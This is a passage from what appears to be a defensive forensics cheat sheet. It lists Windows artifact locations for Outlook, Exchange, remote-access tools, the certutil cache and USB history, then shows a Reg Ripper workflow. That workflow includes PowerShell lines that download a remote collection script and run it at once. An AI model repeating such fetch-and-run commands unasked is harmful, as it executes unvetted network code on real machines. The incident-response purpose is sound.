C:\Users\*\AppData\Local\Microsoft\Outlook\*.pst

C:\Users\*\AppData\Local\Microsoft\Outlook\*.ost

C:\Users\*\AppData\Local\Microsoft\Outlook\*.nst

C:\Users\*\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\. #Attachments temporarily go here
````

Exchange:

```
C:\Program Files\Microsoft\Exchange Server\*\Logging\

C:\Windows\Microsoft.NET\Framework*\v*\Temporary ASP.NET Files\*\

C:\inetpub\wwwroot\aspnet_client\*\*\

C:\Inetpub\wwwroot\aspnet_client\system_web\*\*

C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\*\*\

C:\Program Files\Microsoft\Exchange Server\*\TransportRoles\Logs\*\*.log
```
 
### Remote Management Logs

Things that MSPs, SysAdmins, and bad guys love to use

AnyDesk

```
C:\Users\*\AppData\Roaming\AnyDesk\*.trace

C:\ProgramData\AnyDesk\*.trace

C:\Users\*\Videos\AnyDesk\*.anydesk

C:\Users\*\AppData\Roaming\AnyDesk\connection_trace.txt

C:\ProgramData\AnyDesk\connection_trace.txt

C:\Windows\SysWOW64\config\systemprofile\AppData\Roaming\AnyDesk\*
```

Atera (linked to Splashtop)

```
C:\windows\temp\AteraSetupLog.txt

C:\\Program Files\\ATERA Networks\\AteraAgent\log.txt

HKLM\SOFTWARE\ATERA Networks\AlphaAgent value IntegratorLogin
```

Kaseya

```
C:\Users\*\AppData\Local\Kaseya\Log\KaseyaLiveConnect\

C:\ProgramData\Kaseya\Log\Endpoint\*

C:\Program Files*\Kaseya\*\agentmon.log

C:\Users\*\AppData\Local\Temp\KASetup.log

C:\Windows\Temp\KASetup.log

C:\ProgramData\Kaseya\Log\KaseyaEdgeServices\
```

mRemoteNG
```
C:\Users\*\AppData\Roaming\mRemoteNG\mRemoteNG.log

C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml

C:\Users\*\AppData\*\mRemoteNG\**10\user.config
```

RAdmin

```
C:\Windows\SysWOW64\rserver30\Radm_log.htm

C:\Windows\System32\rserver30\Radm_log.htm

C:\Windows\System32\rserver30\CHATLOGS\*\*.htm

C:\Users\*\Documents\ChatLogs\*\*.htm
```
 
RealVNC

`C:\Users\*\AppData\Local\RealVNC\vncserver.log`

ScreenConnect:

```
C:\Program Files*\ScreenConnect\App_Data\Session.db

C:\Program Files*\ScreenConnect\App_Data\User.xml

C:\ProgramData\ScreenConnect Client*\user.config
```

Splashtop (Linked to Atera)
```
C:\windows\System32\winevt\Logs\Splashtop-Splashtop Streamer-Remote Session%4Operational.evtx

C:\windows\System32\winevt\Logs\Splashtop-Splashtop Streamer-Status%4Operational.evtx

C:\ProgramData\Splashtop\Temp\log

C:\Program Files (x86)\Splashtop\Splashtop Remote\Server\log
```

TeamViewer

```
C:\Program Files*\TeamViewer\connections*.txt

C:\Program Files*\TeamViewer\TeamViewer*_Logfile*

C:\Users\*\AppData\Roaming\TeamViewer\connections.txt

C:\Users\*\AppData\Roaming\TeamViewer\MRU\RemoteSupport\*tvc
```

## Cerutil History

Cerutil creates some archives

![image](https://user-images.githubusercontent.com/44196051/171154435-b1be160f-1c13-40e0-9f6c-b223a5a84da4.png)

`C:\Users\*\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\`

Strings it homie!

![image](https://user-images.githubusercontent.com/44196051/171154499-0f12bf0b-7217-4e0e-9ca5-9be69785c4ab.png)

## USBs


The subkeys in this part of the registry will list the names of all the USBs connected to this machine in the past.  

Gather and corroborate USB names here for the next log. 

```
HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR
```

![image](https://user-images.githubusercontent.com/44196051/165262357-1c7aa518-f33c-4746-9aad-5e9e0c2042fa.png)


You can leverage the next log along with your confirmed USB name from the registry, to identify a window of time that this USB was plugged in to the computer. 

```
C:\windows\inf\setupapi.dev.log
```

![image](https://user-images.githubusercontent.com/44196051/165262306-d464db54-0fcf-45ee-9d3f-790cfefa615c.png)

I never bother with this part, but you can also grab this EVTX

```
C:\windows\System32\winevt\Logs\Microsoft-Windows-Partition%4Diagnostic.evtx
``` 

and use chainsaw in search mode

```powershell
chainsaw search ./ -s "medicat"
chainsaw search ./ -e "1006" 

# EventID 1006, for USB investigations, offers verbose results but is a good un' https://df-stream.com/2018/07/partition-diagnostic-event-log-and-usb-device-tracking-p2/
```

![image](https://user-images.githubusercontent.com/44196051/165262524-499a1411-9d43-4b78-93fd-35f96432b69a.png)

You can probably also find some stuff from the [Jumplist](#jump-lists) and LNK artefacts that have some relevance to your USB investigation. 

![image](https://user-images.githubusercontent.com/44196051/165262678-15449dc3-568c-48b8-9e53-da3dc9bd526a.png)

![image](https://user-images.githubusercontent.com/44196051/165262935-a3959f04-bd0f-421f-ab88-a50e494e7a75.png)


## Reg Ripper

[Harlan Carvey](https://twitter.com/keydet89) knows how to write a pretty mean tool or two. Reg Ripper is a forensic one designed to aid you in parsing, timelining, and surgically interrograting registry hives to uncover evidence of malice. [Registry Collection made easy with this](https://gist.github.com/Purp1eW0lf/6bbb2c1e22fe64a151d7ab97be8e83bb) script right here. 

```powershell

# Here's a script that will pull collect all the registry files for you
wget -useb https://gist.githubusercontent.com/Purp1eW0lf/6bbb2c1e22fe64a151d7ab97be8e83bb/raw/bc60f36491eeb94a02fd9804fdcc4a66b7dbb87a/Registry_Collect.ps1 -outfile ./Registry_Collection.ps1
./Registry_Collection.ps1 #then execute

# Take your registry collected files from the above script. Prepare them for analysis
expand-archive C:\Users\*\Desktop\Huntress_Registry_Collection_2022_Dec_30_Fri_UTC+00.zip C:\registry_hives\

# then download Reg Ripper and unzip it
(New-Object Net.WebClient).DownloadFile("https://github.com/keydet89/RegRipper3.0/archive/refs/heads/master.zip", "C:\rip_master.zip");
expand-archive C:\rip_master.zip C:\

#Recursively run reg ripper now
GCI "C:\registry_hives\" -recurse -force -include SYSTEM, SAM, SECURITY, SOFTWARE, *.dat, *.hve | Foreach-Object {C:\RegRipper3.0-master\rip.exe -r $_.fullname -a >> reg_ripper_output.txt ; write-host "---Parsing Hive:" $_ -ForegroundColor magenta >> C:\reg_ripper_output.txt}
#run with timeline option
GCI "C:\registry_hives\" -recurse -force -include SYSTEM, SAM, SECURITY, SOFTWARE, *.dat, *.hve | Foreach-Object {C:\RegRipper3.0-master\rip.exe -r $_.fullname -aT >> timelined_reg_ripper_output.txt ; write-host "---Parsing Hive:" $_ -ForegroundColor magenta >> C:\timeline_reg_ripper_output.txt}

```
![image](https://user-images.githubusercontent.com/44196051/210093684-9e1cbd62-f7f2-4ebf-b7c2-93177a97a879.png)

<img width="1395" alt="image" src="https://user-images.githubusercontent.com/44196051/210093620-1d616cfe-8e2a-413f-98c5-998cd091769c.png">

